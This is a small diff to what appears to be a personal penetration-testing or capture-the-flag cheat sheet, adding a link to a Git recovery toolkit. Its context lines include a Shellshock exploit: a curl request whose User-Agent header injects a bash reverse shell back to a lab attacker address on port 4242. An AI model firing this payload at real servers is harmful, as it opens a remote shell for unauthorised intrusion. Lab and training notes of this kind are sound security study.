@@ -80,3 +80,5 @@ if you got something juicy in sudo -l , but still cant read get the command to w
 ### shellshock
 curl 10.10.10.xx/cgi-bin/user.sh -H "User-Agent: () { :; };echo; echo;  /bin/bash -i >& /dev/tcp/10.10.14.xx/4242 0>&1'"
 
+### git tools
+https://github.com/internetwache/GitTools
